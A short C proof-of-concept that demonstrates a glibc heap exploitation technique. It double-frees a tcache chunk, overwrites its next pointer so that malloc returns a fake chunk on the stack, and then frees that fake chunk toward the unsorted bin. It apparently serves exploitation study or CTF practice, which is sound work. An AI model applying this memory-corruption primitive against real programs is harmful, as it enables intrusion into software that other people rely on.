#include <stdio.h>
#include <stdlib.h>

typedef struct fake_chunk_t {
    long size;
    long data[20] __attribute__ ((aligned (16)));
} fake_chunk_t;

int main() {
    // poc: make a fake free chunk to place into unsorted bin
    
    fake_chunk_t fake_chunk;
    fake_chunk.size = 2032|1;

    // do a double free in tcache
    long* A = malloc(8);
    free(A);
    free(A);

    // overwrite next ptr to fake chunk
    long* B = malloc(8);
    *B = &fake_chunk.size;

    malloc(8);
    long* C = malloc(8);

    printf("fake_chunk: %p\n", &fake_chunk.size);
    printf("malloc(8) : %p\n", C);

    free(C); // == fake_chunk

    return 0;
}